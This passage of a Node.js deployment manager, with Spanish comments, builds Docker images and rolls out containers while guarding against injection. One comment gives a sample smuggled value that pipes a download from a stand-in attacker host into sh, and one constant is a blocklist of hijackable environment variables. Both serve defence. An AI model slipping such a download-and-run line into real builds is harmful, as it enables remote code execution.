const { spawn } = require('child_process');
const { EventEmitter } = require('events');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');

const caddyManager = require('./caddyManager');
const repoSync = require('./repoSync');
const portRegistry = require('./portRegistry');
const { atomicWriteJsonSync, assertContainedPath } = require('./ssrfGuard');
const { parseSafeCommandArgv, sanitizeWorkdir } = require('./safeCommand');

/** @type {any} */
let _ingressManager = null;
function getIngressManager() {
  if (!_ingressManager) {
    try { _ingressManager = require('./ingressManager'); } catch (e) {}
  }
  return _ingressManager;
}

/** @type {any} */
let _databaseManager = null;
function getDatabaseManager() {
  if (!_databaseManager) {
    try { _databaseManager = require('./databaseManager'); } catch (e) {}
  }
  return _databaseManager;
}
/** @type {any} */
let _projectManager = null;
function getProjectManager() {
  if (!_projectManager) {
    try { _projectManager = require('./projectManager'); } catch (e) {}
  }
  return _projectManager;
}

/** Calcula concurrencia máxima segura de builds según la RAM total del VPS para evitar OOM. */
function defaultMaxConcurrentBuilds() {
  const envVal = parseInt(String(process.env.CULKIBO_MAX_CONCURRENT_BUILDS || ''), 10);
  if (Number.isInteger(envVal) && envVal >= 1 && envVal <= 16) return envVal;
  const totalGb = os.totalmem() / (1024 * 1024 * 1024);
  if (totalGb <= 3) return 1;
  if (totalGb <= 6) return 2;
  return 3;
}

const ROOT_BASE_DIR = process.env.CULKIBO_DATA_DIR
  ? path.resolve(process.env.CULKIBO_DATA_DIR)
  : path.resolve(__dirname, '..', '..');
const DATA_DIR = path.join(ROOT_BASE_DIR, 'data');
const TMP_ENV_DIR = path.join(DATA_DIR, '.tmp');

/** Variables del host que un proyecto jamás puede sobreescribir al invocar herramientas del host. */
const HOST_HIJACK_ENV_BLOCKLIST = new Set([
  'PATH', 'PATHEXT', 'COMSPEC', 'SYSTEMROOT', 'WINDIR',
  'DOCKER_HOST', 'DOCKER_CONFIG', 'DOCKER_CONTEXT', 'DOCKER_CERT_PATH', 'DOCKER_TLS_VERIFY', 'DOCKER_API_VERSION',
  'BUILDKIT_HOST', 'LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH',
  'NODE_OPTIONS', 'BASH_ENV', 'ENV', 'IFS',
  'GIT_SSH_COMMAND', 'GIT_ASKPASS', 'GIT_EXEC_PATH',
  'HOME', 'USERPROFILE', 'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY', 'NO_PROXY'
]);

/** Filtra variables de usuario antes de mezclarlas con el entorno de un proceso del host (build/nixpacks). */
function filterSafeHostEnv(vars) {
  /** @type {Record<string, string>} */
  const out = {};
  for (const [k, v] of Object.entries(vars || {})) {
    if (!isValidEnvName(k)) continue;
    if (HOST_HIJACK_ENV_BLOCKLIST.has(k.toUpperCase())) continue;
    out[k] = String(v == null ? '' : v);
  }
  return out;
}

/** @type {any} */
let containerOrchestrator = null;
try { containerOrchestrator = require('./containerOrchestrator'); } catch (e) {}

/** @type {any} */
let notificationService = null;
try { notificationService = require('./notificationService'); } catch (e) {}

/**
 * Despliegue a producción: de un directorio con código a un servicio duradero.
 *
 * Esto es lo que separaba a Culkibo de un ejecutor de procesos de desarrollo.
 * `localRunner` clona y lanza `npm run dev`; aquí construimos una imagen,
 * arrancamos un contenedor con política de reinicio y límites, esperamos a que
 * esté sano y solo entonces movemos la ruta de Caddy.
 *
 * ---------------------------------------------------------------------------
 * POR QUÉ ESTÁ ESCRITO ASÍ (las tres decisiones que no son negociables)
 * ---------------------------------------------------------------------------
 *
 * 1. NUNCA SE CONSTRUYE UNA CADENA DE SHELL.
 *    Todo pasa por `spawn(bin, [argv], { shell: false })`. Los 21 críticos de
 *    Coolify y los 34 de Dokploy son una sola clase de fallo: un nombre de
 *    repositorio, una variable de entorno o un nombre de imagen interpolados en
 *    una cadena que acaba en `sh -c`. Sin shell no hay nada donde inyectar.
 *
 * 2. LOS SECRETOS NO PASAN POR ARGV.
 *    `docker run -e CLAVE` (sin `=valor`) toma el valor del entorno del proceso
 *    que lanza docker. Lo mismo `docker build --build-arg NOMBRE`. Así el valor
 *    viaja por el entorno del hijo y jamás aparece en `ps`, ni en los logs de
 *    build, ni en un mensaje de error. En argv solo viajan NOMBRES, que no son
 *    secretos.
 *
 * 3. CULKIBO NO INYECTA NINGÚN BUILD ARG QUE CAMBIE ENTRE BUILDS.
 *    Coolify se destruyó su propia caché de capas inyectando un argumento que
 *    cambiaba en cada ejecución (issue #7040: 1 min -> 4,5 min).
 *
 *    El mecanismo exacto, según la referencia de Dockerfile de BuildKit: la
 *    línea `ARG` en sí no entra en ninguna clave de caché, pero a partir de ella
 *    la variable se inyecta en el ENTORNO de cada `RUN` posterior, y la clave de
 *    caché de un `RUN` se calcula sobre su línea de comandos MÁS ese entorno.
 *    Por eso el fallo de caché ocurre en el PRIMER USO, no en la definición, y
 *    a partir de ahí se propaga a todas las capas siguientes. Un `ARG` volátil
 *    declarado arriba del fichero tira el build entero.
 *
 *    Aquí el conjunto de build args que aporta Culkibo es literalmente vacío;
 *    solo se pasan los que el usuario declare, y se pasan por nombre.
 *    `tests/deploy.test.js` lo verifica comparando dos invocaciones consecutivas
 *    byte a byte.
 */

// ---------------------------------------------------------------------------
// Parámetros por defecto
//
// Los tiempos siguen a basecamp/kamal-proxy, que es el arte previo correcto
// para esto. Valores leídos de su `internal/server/service.go`:
//   DefaultDeployTimeout        = 30 s
//   DefaultDrainTimeout         = 30 s
//   DefaultHealthCheckInterval  =  1 s
//   DefaultHealthCheckTimeout   =  5 s
//   DefaultHealthCheckPath      = "/up"
//
// Divergencia deliberada: kamal considera sano solo un 200-299 sobre `/up`,
// porque Rails expone ese endpoint por convención. Culkibo despliega cualquier
// cosa que le echen, así que sondea `/` y acepta cualquier estado < 500: un 404
// en la raíz significa que el proceso escucha y enruta —está vivo—, mientras que
// un 502 significa que no. El endpoint y el umbral son configurables.
// ---------------------------------------------------------------------------
const DEFAULTS = {
  buildTimeoutMs: 20 * 60 * 1000,
  healthTimeoutMs: 30000,
  healthIntervalMs: 1000,
  healthPath: '/',
  // Ventana durante la cual el contenedor viejo SIGUE VIVO después de que la
  // ruta ya apunte al nuevo. Es el apretón de manos que le falta a Coolify
  // (issue #8627): allí el contenedor viejo muere a la vez que se recarga el
  // proxy, y las peticiones en vuelo se convierten en 502/503.
  drainTimeoutMs: 30000,
  stopGraceSeconds: 10,
  memoryMb: 1024,
  cpus: '1.0',
  pidsLimit: 512,
  containerPort: 3000,
  // Generaciones que se conservan paradas (no borradas) para que un rollback
  // sea arrancar-y-conmutar en vez de reconstruir.
  keepReleases: 2,
  network: process.env.CULKIBO_DOCKER_NETWORK || 'culkibo',
  caddyContainerName: process.env.CULKIBO_CADDY_CONTAINER || 'culkibo-caddy'
};

const STORE_FILE = path.join(DATA_DIR, 'deployments.json');
const STORE_BAK_FILE = `${STORE_FILE}.bak`;
const NON_TERMINAL_STATUSES = new Set([
  'pendiente', 'en_cola', 'sincronizando', 'construyendo', 'pre_deploy', 'arrancando', 'verificando', 'promocionando', 'post_deploy'
]);
const MAX_RUNTIME_LOG_STREAMS = 20;

// ---------------------------------------------------------------------------
// Saneadores
//
// Todo lo que viene del proyecto (id, nombre, package.json del repositorio
// clonado) es influenciable por quien controla el repositorio. Antes de que
// toque un argv o el texto de un Dockerfile pasa por aquí.
// ---------------------------------------------------------------------------

/** Etiqueta apta para nombre de imagen/contenedor de Docker. */
function safeSlug(value, fallback = 'app') {
  const slug = String(value == null ? '' : value)
    .toLowerCase()
    .replace(/[^a-z0-9_.-]/g, '-')
    .replace(/^[^a-z0-9]+/, '')
    .replace(/-+/g, '-')
    .slice(0, 48);
  return slug || fallback;
}

/**
 * Un nombre de variable de entorno válido en POSIX.
 *
 * Importa más de lo que parece: el nombre SÍ viaja en argv. Si aceptásemos
 * cualquier cosa, una clave llamada `--privileged` acabaría en la línea de
 * comandos de `docker run`. Docker la consumiría como valor de `-e`, pero no
 * queremos depender de ese detalle: se rechaza y punto.
 */
function isValidEnvName(name) {
  return typeof name === 'string' && /^[A-Za-z_][A-Za-z0-9_]{0,254}$/.test(name);
}

/**
 * Ruta de sondeo de salud. Va tanto a una URL como al `--health-cmd` del
 * contenedor, así que se restringe a un subconjunto sin comillas, espacios ni
 * `..`.
 */
function sanitizeHealthPath(value) {
  const raw = String(value == null ? '' : value).trim() || '/';
  if (!/^\/[A-Za-z0-9._~\-/]*$/.test(raw)) return null;
  if (raw.includes('..')) return null;
  return raw;
}

/**
 * Versión mayor de Node declarada en `engines`.
 *
 * Esto se escribe dentro de una línea `FROM` de un Dockerfile generado. Un
 * `engines.node` de `22-alpine\nRUN curl atacante.example | sh` sería ejecución
 * de código en el build si lo copiásemos tal cual. Solo se acepta un entero.
 */
function sanitizeNodeMajor(value) {
  const match = String(value == null ? '' : value).match(/(\d{1,2})/);
  if (!match) return null;
  const major = parseInt(match[1], 10);
  return major >= 18 && major <= 40 ? String(major) : null;
}

/** Puerto TCP válido. */
function sanitizePort(value, fallback) {
  const port = parseInt(value, 10);
  return Number.isInteger(port) && port > 0 && port < 65536 ? port : fallback;
}

class DeployManager extends EventEmitter {
  constructor() {
    super();
    /** projectId -> Promise, para serializar despliegues del mismo proyecto. */
    this.locks = new Map();
    /**
     * projectId -> { project, options } pendiente de lanzar cuando termine el
     * despliegue en curso. Una sola plaza y gana el último: si llegan tres
     * pushes durante un build de cuatro minutos, lo que hay que desplegar
     * después es el ÚLTIMO commit, no los tres en fila.
     */
    this.pending = new Map();
    /** projectId -> Promise del drenaje en curso (las pruebas lo esperan). */
    this.drains = new Map();
    /** containerName -> { projectId, timer, resolve } para drenajes independientes por contenedor (evita fugas RAM). */
    this._drainTimers = new Map();
    /** Contenedores actualmente arrancando/verificando que jamás deben ser podados por un drenaje paralelo. */
    this.inFlightContainers = new Set();
    /** Proyectos olvidados durante un despliegue en curso (para abortar y limpiar sin dejar huérfanos). */
    this._abortedProjects = new Set();
    /** Operaciones activas por proyecto para cancelación limpia en cualquier fase previa a promoción. */
    /** @type {Map<string, { deploymentId: string, stage: string, controller: AbortController, children: Set<any>, containerName: string | null }>} */
    this._activeOps = new Map();
    /** Cooldown y circuit-breaker por contenedor para el watchdog de producción (evita spam y ping-pong A<->B). */
    /** @type {Map<string, { lastNotifiedAt: number, rolledBackPairs: Set<string> }>} */
    this._incidentCooldown = new Map();
    /** Contador global de streams SSE activos de logs de producción. */
    this._activeLogStreams = 0;
    /** Último timestamp de respaldo `.bak` de deployments.json. */
    this._lastBakAt = 0;
    /** Puertos reservados en vuelo entre findFreePort() y docker run (coordinado con portRegistry). */
    this._pendingPorts = new Set();
    /** Semáforo global de builds concurrentes para evitar OOM en VPS de 1–4 GB RAM. */
    this.maxConcurrentBuilds = defaultMaxConcurrentBuilds();
    this._activeBuilds = 0;
    /** @type {Array<{ projectId: string, deploymentId: string, resolve: (val?: any) => void, reject: (err: any) => void, queuedAt: number }>} */
    this._buildQueue = [];
    /** @type {any} */
    this.dockerProbe = null;
    this.dockerProbeAt = 0;
    this.dockerProbeTtlMs = 15000;
    /** Cachés TTL de 60 s para evitar spawns repetitivos de `hasBinary` y `ensureNetwork`. */
    this._binaryCache = new Map();
    this._networkCache = new Map();
    /** @type {Record<string, any>} */
    this.store = this.loadStore();
    portRegistry.registerProvider('deployManager', () => {
      /** @type {number[]} */
      const ports = [];
      for (const st of Object.values(this.store)) {
        if (st && st.current && st.current.hostPort) ports.push(Number(st.current.hostPort));
        if (st && st.previous && st.previous.hostPort) ports.push(Number(st.previous.hostPort));
      }
      return ports;
    });
  }

  /**
   * Adquiere una plaza en el semáforo global de construcción (soporta cancelación limpia sin fuga de slots).
   * @param {string} projectId
   * @param {string} deploymentId
   * @param {{ signal?: AbortSignal | null }} [options]
   */
  async acquireBuildSlot(projectId, deploymentId, { signal = null } = {}) {
    if (signal && signal.aborted) {
      const err = new Error('Despliegue cancelado antes de iniciar la construcción');
      /** @type {any} */ (err).code = 'DEPLOY_CANCELLED';
      throw err;
    }
    if (this._activeBuilds < this.maxConcurrentBuilds) {
      this._activeBuilds++;
      return { waited: false, position: 0 };
    }
    const position = this._buildQueue.length + 1;
    await new Promise((resolve, reject) => {
      /** @type {{ projectId: string, deploymentId: string, resolve: (val?: any) => void, reject: (err: any) => void, queuedAt: number }} */
      const entry = {
        projectId,
        deploymentId,
        resolve: () => {
          if (signal && onAbort) signal.removeEventListener('abort', onAbort);
          resolve(undefined);
        },
        reject: (err) => {
          if (signal && onAbort) signal.removeEventListener('abort', onAbort);
          reject(err);
        },
        queuedAt: Date.now()
      };
      const onAbort = () => {
        const idx = this._buildQueue.indexOf(entry);
        if (idx !== -1) {
          this._buildQueue.splice(idx, 1);
          const err = new Error('Despliegue cancelado mientras esperaba en cola');
          /** @type {any} */ (err).code = 'DEPLOY_CANCELLED';
          reject(err);
        }
      };
      if (signal) signal.addEventListener('abort', onAbort, { once: true });
      this._buildQueue.push(entry);
    });
    return { waited: true, position };
  }

  releaseBuildSlot() {
    if (this._buildQueue.length > 0) {
      const next = this._buildQueue.shift();
      if (next) next.resolve();
      return;
    }
    if (this._activeBuilds > 0) this._activeBuilds--;
  }

  getQueueStatus() {
    return {
      maxConcurrentBuilds: this.maxConcurrentBuilds,
      activeBuilds: this._activeBuilds,
      queuedBuilds: this._buildQueue.map((q, idx) => ({
        position: idx + 1,
        projectId: q.projectId,
        deploymentId: q.deploymentId,
        waitingMs: Date.now() - q.queuedAt
      })),
      inFlightProjects: Array.from(this.locks.keys()),
      pendingSuperseding: Array.from(this.pending.keys())
    };
  }

  // -------------------------------------------------------------------------
  // Persistencia (con respaldo .bak y recuperación de estados interrumpidos)
  // -------------------------------------------------------------------------

  loadStore() {
    let parsed = null;
    for (const candidate of [STORE_FILE, STORE_BAK_FILE]) {
      try {
        if (!fs.existsSync(candidate)) continue;
        const data = JSON.parse(fs.readFileSync(candidate, 'utf8'));
        if (data && typeof data === 'object' && !Array.isArray(data)) {
          parsed = data;
          break;
        }
      } catch (e) {
        console.error(`[DeployManager] No se pudo leer ${path.basename(candidate)}:`, e.message);
      }
    }
    if (!parsed) return {};

    // Reconciliar cualquier despliegue que quedó en estado no terminal por un reinicio/crash del daemon
    let repaired = false;
    const nowIso = new Date().toISOString();
    for (const st of Object.values(parsed)) {
      if (!st || !Array.isArray(st.history)) continue;
      for (const h of st.history) {
        if (h && NON_TERMINAL_STATUSES.has(h.status)) {
          h.status = 'interrumpido';
          h.error = h.error || 'Daemon reiniciado durante el despliegue';
          h.finishedAt = h.finishedAt || nowIso;
          repaired = true;
        }
      }
    }
    if (repaired) {
      try { atomicWriteJsonSync(STORE_FILE, parsed, 0o600); } catch (e) {}
    }
    return parsed;
  }

  /** Escritura atómica con permisos 0600 y copia de respaldo `.bak` (throttled cada 5 s). */
  saveStore() {
    try {
      const now = Date.now();
      if (now - this._lastBakAt >= 5000 && fs.existsSync(STORE_FILE)) {
        try { fs.copyFileSync(STORE_FILE, STORE_BAK_FILE); this._lastBakAt = now; } catch (e) {}
      }
      atomicWriteJsonSync(STORE_FILE, this.store, 0o600);
    } catch (e) {
      console.error('[DeployManager] No se pudo guardar deployments.json:', e.message);
    }
  }

  getState(projectId) {
    if (!this.store[projectId]) {
      this.store[projectId] = { current: null, previous: null, history: [] };
    }
    return this.store[projectId];
  }

  /** Historial de despliegues, el más reciente primero. */
  listDeployments(projectId, limit = 20) {
    return this.getState(projectId).history.slice(0, limit);
  }

  getDeployment(projectId, deploymentId) {
    return this.getState(projectId).history.find(d => d.id === deploymentId) || null;
  }

  /** Cancela el drenaje de un contenedor concreto (p. ej. al promocionarlo de vuelta en rollback). */
  cancelContainerDrain(containerName) {
    const entry = this._drainTimers.get(containerName);
    if (!entry) return;
    clearTimeout(entry.timer);
    this._drainTimers.delete(containerName);
    entry.resolve(true);
  }

  /** Cancela todos los drenajes pendientes de un proyecto (al parar, borrar o hacer rollback). */
  cancelDrain(projectId) {
    for (const [cName, entry] of Array.from(this._drainTimers.entries())) {
      if (entry.projectId === projectId) {
        clearTimeout(entry.timer);
        this._drainTimers.delete(cName);
        entry.resolve(true);
      }
    }
  }

  cancelAllDrains() {
    for (const cName of Array.from(this._drainTimers.keys())) {
      this.cancelContainerDrain(cName);
    }
  }

  /**
   * Detiene inmediatamente los contenedores en ventana de drenaje al apagar el daemon,
   * evitando que contenedores `--restart unless-stopped` queden vivos para siempre.
   */
  async flushDrainsForShutdown({ timeoutMs = 3500 } = {}) {
    const retiring = [];
    for (const [cName, entry] of Array.from(this._drainTimers.entries())) {
      const st = this.store[entry.projectId];
      if (!st || !st.current || st.current.containerName !== cName) {
        retiring.push(cName);
      }
      clearTimeout(entry.timer);
      this._drainTimers.delete(cName);
      entry.resolve(true);
    }
    if (retiring.length === 0) return { stopped: [] };
    const stopTasks = retiring.map((name) =>
      this.runDocker(['stop', '--time', '3', name], { timeoutMs: Math.max(2000, timeoutMs) })
        .then((r) => (r.code === 0 ? name : null))
        .catch(() => null)
    );
    const results = await Promise.race([
      Promise.all(stopTasks),
      new Promise((resolve) => {
        const t = setTimeout(() => resolve([]), timeoutMs);
        if (t.unref) t.unref();
      })
    ]);
    return { stopped: Array.isArray(results) ? results.filter(Boolean) : [] };
  }

  /**
   * Cancela limpiamente un despliegue en cola o en curso antes de la promoción atómica.
   * Mata el proceso activo (git/docker build/pre-deploy) y libera cualquier plaza de cola.
   */
  cancelDeploy(projectId, { reason = 'Cancelado por el usuario' } = {}) {
    const op = this._activeOps.get(projectId);
    if (!op) {
      if (this.pending.has(projectId)) {
        this.pending.delete(projectId);
        return { cancelled: true, stage: 'pendiente', deploymentId: null, message: 'Despliegue encolado cancelado' };
      }
      return { cancelled: false, status: 404, error: 'No hay ningún despliegue en curso para este proyecto' };
    }
    if (op.stage === 'promocionando') {
      return {
        cancelled: false,
        status: 409,
        deploymentId: op.deploymentId,
        stage: op.stage,
        error: 'Promoción atómica en curso; espera 1 s y utiliza Rollback si necesitas volver atrás'
      };
    }
    this._abortedProjects.add(projectId);
    this.pending.delete(projectId);
    try { op.controller.abort(new Error(reason)); } catch (e) {}
    for (const child of Array.from(op.children)) {
      try { child.kill('SIGTERM'); } catch (e) {}
      const esc = setTimeout(() => {
        try { child.kill('SIGKILL'); } catch (e) {}
      }, 3000);
      if (esc.unref) esc.unref();
    }
    return {
      cancelled: true,
      deploymentId: op.deploymentId,
      stage: op.stage,
      message: `Cancelación solicitada en fase «${op.stage}»`
    };
  }

  /**
   * Olvida todo lo que sabemos de un proyecto borrado, cancela cualquier build en
   * vuelo y retira sus contenedores de producción sin dejar huérfanos.
   */
  forget(projectId) {
    this._abortedProjects.add(projectId);
    try { this.cancelDeploy(projectId, { reason: 'Proyecto eliminado durante el despliegue' }); } catch (e) {}
    this.cancelDrain(projectId);
    const prevState = this.store[projectId];
    const had = Boolean(prevState);
    delete this.store[projectId];
    this.pending.delete(projectId);
    if (had) {
      this.saveStore();
      const names = [prevState.current?.containerName, prevState.previous?.containerName].filter(Boolean);
      if (names.length > 0) {
        Promise.allSettled([
          caddyManager.removeRoute(projectId).catch(() => {}),
          ...names.map((n) => this.runDocker(['rm', '-f', n], { timeoutMs: 20000 }).catch(() => {}))
        ]).catch(() => {});
      }
    }
    return { removed: had };
  }

  // -------------------------------------------------------------------------
  // Ejecución de binarios externos — sin shell, nunca
  // -------------------------------------------------------------------------

  /**
   * Lanza un binario con un array de argumentos y transmite su salida línea a
   * línea.
   *
   * `shell: false` es lo que convierte la inyección de comandos en imposible en
   * vez de en improbable. `env` permite pasar valores (secretos incluidos) sin
   * que aparezcan en argv.
   */
  /**
   * @param {string} bin
   * @param {string[]} args
   * @param {{timeoutMs?: number, cwd?: string, env?: any, onLine?: ((line: string) => void) | null, signal?: AbortSignal | null, projectId?: string | null}} [options]
   * @returns {Promise<{code: number, stdout: string, stderr: string, spawnError?: boolean, timedOut?: boolean, aborted?: boolean}>}
   */
  runTool(bin, args, { timeoutMs = 120000, cwd = undefined, env = undefined, onLine = null, signal = null, projectId = null } = {}) {
    if (signal && signal.aborted) {
      return Promise.resolve({ code: -3, stdout: '', stderr: 'Operación cancelada', aborted: true });
    }
    return new Promise((resolve) => {
      let child;
      try {
        child = spawn(bin, args, {
          cwd,
          env: env || process.env,
          shell: false,
          windowsHide: true
        });
      } catch (err) {
        return resolve({ code: -1, stdout: '', stderr: err.message, spawnError: true });
      }

      const op = projectId ? this._activeOps.get(projectId) : null;
      if (op) op.children.add(child);

      /** @type {string[]} */
      const stdout = [];
      /** @type {string[]} */
      const stderr = [];
      let buffered = '';

      const pump = (chunk, sink) => {
        const text = chunk.toString();
        sink.push(text);
        if (sink.length > 2000) sink.shift();
        if (!onLine) return;
        buffered += text;
        const lines = buffered.split(/\r?\n/);
        buffered = lines.pop() || '';
        for (const line of lines) {
          if (line.trim()) onLine(line.trim());
        }
      };

      child.stdout.on('data', (d) => pump(d, stdout));
      child.stderr.on('data', (d) => pump(d, stderr));

      let timedOut = false;
      let aborted = false;
      /** @type {ReturnType<typeof setTimeout> | null} */
      let killEscalation = null;

      const terminateChild = () => {
        try { child.kill('SIGTERM'); } catch (e) {}
        killEscalation = setTimeout(() => {
          try { child.kill('SIGKILL'); } catch (e) {}
        }, 5000);
        if (killEscalation.unref) killEscalation.unref();
      };

      const onAbort = () => {
        aborted = true;
        terminateChild();
      };
      if (signal) signal.addEventListener('abort', onAbort, { once: true });

      const timer = setTimeout(() => {
        timedOut = true;
        terminateChild();
      }, timeoutMs);
      if (timer.unref) timer.unref();

      const cleanup = () => {
        clearTimeout(timer);
        if (killEscalation) clearTimeout(killEscalation);
        if (signal) signal.removeEventListener('abort', onAbort);
        if (op) op.children.delete(child);
      };

      child.on('error', (err) => {
        cleanup();
        resolve({ code: -1, stdout: stdout.join(''), stderr: err.message, spawnError: true, aborted });
      });

      child.on('close', (code) => {
        cleanup();
        if (buffered.trim() && onLine) onLine(buffered.trim());
        resolve({
          code: aborted ? -3 : (timedOut ? -2 : code),
          stdout: stdout.join(''),
          stderr: stderr.join(''),
          timedOut,
          aborted
        });
      });
    });
  }

  runDocker(args, options = {}) {
    return this.runTool('docker', args, options);
  }

  /** ¿Hay un daemon de Docker con el que hablar? No lanza nunca. */
  async detectDocker({ force = false } = {}) {
    const now = Date.now();
    if (!force && this.dockerProbe && (now - this.dockerProbeAt) < this.dockerProbeTtlMs) {
      return this.dockerProbe;
    }
    const res = await this.runDocker(['version', '--format', '{{.Server.Version}}'], { timeoutMs: 5000 });
    const version = (res.stdout || '').trim();
    this.dockerProbe = res.code === 0 && version
      ? { available: true, version, reason: null }
      : {
          available: false,
          version: null,
          reason: res.spawnError
            ? 'El cliente de Docker no está instalado en este host'
            : 'El daemon de Docker no responde en este host'
        };
    this.dockerProbeAt = now;
    return this.dockerProbe;
  }

  /** ¿Está `bin` en el PATH? Cacheado 60 s para no spawnear por cada build. */
  async hasBinary(bin) {
    if (!/^[a-z0-9_-]+$/i.test(bin)) return false;
    const now = Date.now();
    const cached = this._binaryCache.get(bin);
    if (cached && (now - cached.at) < 60000) return cached.ok;
    const res = await this.runTool(bin, ['--version'], { timeoutMs: 4000 });
    const ok = res.code === 0;
    this._binaryCache.set(bin, { at: now, ok });
    return ok;
  }

  // -------------------------------------------------------------------------
  // 1. Detección de la estrategia de construcción
  // -------------------------------------------------------------------------

  readJson(file) {
    try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch (e) { return null; }
  }

  /**
   * Decide cómo se construye este proyecto.
   *
   * Orden: Dockerfile del usuario > railpack > nixpacks > Dockerfile generado.
   *
   * Railpack es el sucesor en Go de Nixpacks escrito por Railway (MIT). Se
   * prefiere cuando está porque produce imágenes más pequeñas y su detección
   * cubre más stacks que la nuestra. Pero es una dependencia OPCIONAL: si no
   * está ninguno de los dos, generamos un Dockerfile y seguimos. Culkibo no
   * puede exigir instalar un binario extra para desplegar una app de Node.
   */
  async detectStrategy(contextDir, project = {}) {
    const pkgPath = path.join(contextDir, 'package.json');
    const pkg = fs.existsSync(pkgPath) ? this.readJson(pkgPath) : null;
    const deps = pkg ? { ...(pkg.dependencies || {}), ...(pkg.devDependencies || {}) } : {};
    const scripts = (pkg && pkg.scripts) || {};

    const declaredPort = sanitizePort(project.containerPort, null);
    const healthPath = sanitizeHealthPath(project.healthPath) || DEFAULTS.healthPath;

    // --- Dockerfile del usuario: manda sobre todo lo demás ------------------
    const userDockerfile = ['Dockerfile', 'dockerfile'].find(
      name => fs.existsSync(path.join(contextDir, name))
    );
    if (userDockerfile) {
      return {
        builder: 'dockerfile',
        stack: 'dockerfile',
        dockerfile: userDockerfile,
        containerPort: declaredPort || this.readExposedPort(path.join(contextDir, userDockerfile)) || DEFAULTS.containerPort,
        healthPath,
        // Un Dockerfile ajeno puede traer su propio HEALTHCHECK; no lo pisamos.
        injectHealthcheck: false,
        reason: `Se usará el ${userDockerfile} del repositorio`
      };
    }

    // --- Detección del stack ------------------------------------------------
    const detected = this.detectStack(contextDir, pkg, deps, scripts);

    // --- Constructores externos, si están --------------------------------
    //
    // Railpack primero: es el sucesor en Go de Nixpacks, escrito por Railway y
    // con licencia MIT. Pero tiene un requisito duro que Nixpacks no tiene:
    // habla el protocolo del cliente de BuildKit directamente y aborta nada más
    // arrancar si `BUILDKIT_HOST` no está definido. Tenerlo en el PATH no basta,
    // así que se comprueba y, si no está configurado, se sigue bajando por la
    // lista en vez de fallar el despliegue.
    for (const bin of ['railpack', 'nixpacks']) {
      if (!(await this.hasBinary(bin))) continue;
      if (bin === 'railpack' && !process.env.BUILDKIT_HOST) {
        continue; // sin BUILDKIT_HOST, railpack no puede construir nada
      }
      return {
        builder: bin,
        stack: detected.stack,
        dockerfile: null,
        containerPort: declaredPort || detected.containerPort,
        healthPath,
        injectHealthcheck: false,
        reason: `No hay Dockerfile; se construirá con ${bin} (detectado en el PATH)`
      };
    }

    if (await this.hasBinary('railpack')) {
      // Estaba, pero inutilizable. Decirlo es mejor que ignorarlo en silencio.
      console.warn('[DeployManager] railpack está instalado pero BUILDKIT_HOST no está definido; se ignora');
    }

    return {
      builder: 'generated',
      stack: detected.stack,
      dockerfile: null,
      containerPort: declaredPort || detected.containerPort,
      healthPath,
      injectHealthcheck: true,
      nodeMajor: detected.nodeMajor,
      startCommand: detected.startCommand,
      buildScript: detected.buildScript,
      outputDir: detected.outputDir,
      pythonEntry: detected.pythonEntry,
      reason: detected.stack === 'desconocido'
        ? 'No se ha podido identificar el stack; no hay Dockerfile ni railpack/nixpacks instalados'
        : `No hay Dockerfile; se generará uno para ${detected.stack}`
    };
  }

  /** Lee el primer EXPOSE de un Dockerfile para saber a qué puerto hablar. */
  readExposedPort(dockerfilePath) {
    try {
      const text = fs.readFileSync(dockerfilePath, 'utf8');
      const match = text.match(/^\s*EXPOSE\s+(\d{1,5})/im);
      return match ? sanitizePort(match[1], null) : null;
    } catch (e) {
      return null;
    }
  }

  /** Clasificación del stack a partir de lo que hay en disco. */
  detectStack(contextDir, pkg, deps, scripts) {
    const exists = (...p) => fs.existsSync(path.join(contextDir, ...p));
    const nodeMajor = pkg && pkg.engines ? sanitizeNodeMajor(pkg.engines.node) : null;

    if (pkg) {
      if (deps.next || /next\s+build/.test(scripts.build || '')) {
        return { stack: 'next', containerPort: 3000, nodeMajor, buildScript: 'build', startCommand: null };
      }
      const buildsStatic =
        deps.vite || deps['@vitejs/plugin-react'] || deps['react-scripts'] ||
        /vite\s+build|react-scripts\s+build|ng\s+build|astro\s+build/.test(scripts.build || '');
      if (buildsStatic) {
        // Vite escribe en dist/, CRA en build/. Angular en dist/<nombre>, que no
        // adivinamos: por eso la salida es configurable y esto es solo el valor
        // por defecto sensato.
        const outputDir = deps['react-scripts'] ? 'build' : 'dist';
        return { stack: 'vite', containerPort: 80, nodeMajor, buildScript: 'build', outputDir };
      }
      return {
        stack: 'node',
        containerPort: 3000,
        nodeMajor,
        buildScript: scripts.build ? 'build' : null,
        startCommand: scripts.start ? 'start' : null
      };
    }

    if (exists('go.mod')) {
      return { stack: 'go', containerPort: 8080 };
    }

    if (exists('requirements.txt') || exists('pyproject.toml')) {
      const entry = ['main.py', 'app.py', 'wsgi.py', 'manage.py'].find(f => exists(f)) || null;
      return { stack: 'python', containerPort: 8000, pythonEntry: entry };
    }

    if (exists('index.html') || exists('public', 'index.html')) {
      return { stack: 'static', containerPort: 80, outputDir: exists('public', 'index.html') ? 'public' : '.' };
    }

    return { stack: 'desconocido', containerPort: DEFAULTS.containerPort };
  }

  // -------------------------------------------------------------------------
  // 2. Generación de Dockerfile
  // -------------------------------------------------------------------------

  /**
   * `.dockerignore` por defecto cuando el repo no aporta uno propio.
   *
   * BuildKit lee automáticamente `<dockerfile>.dockerignore` (aquí
   * `.culkibo/Dockerfile.dockerignore`), así que nunca modificamos ni ensuciamos
   * el árbol del usuario y evitamos enviar cientos de MB de `node_modules` o
   * `.git` al daemon de Docker en cada despliegue.
   */
  defaultDockerignore() {
    return [
      '# Generado por Culkibo para acelerar el contexto de construcción.',
      '.git',
      '.github',
      '.culkibo',
      'node_modules',
      '.next',
      'dist',
      'build',
      'coverage',
      '.env',
      '.env.*',
      '!.env.example',
      '*.log',
      '.DS_Store',
      '__pycache__',
      '.venv',
      'venv',
      ''
    ].join('\n');
  }

  /**
   * Devuelve el texto del Dockerfile que construiría este proyecto.
   *
   * Función pura: recibe la estrategia, devuelve una cadena. Se prueba sin
   * Docker y sin tocar el disco. Todo lo interpolado ya viene saneado (versión
   * de Node entera, puertos enteros, rutas validadas).
   *
   * Usa BuildKit (`syntax=docker/dockerfile:1.7`) con montajes de caché
   * persistentes (`--mount=type=cache`) para que las reconstrucciones sucesivas
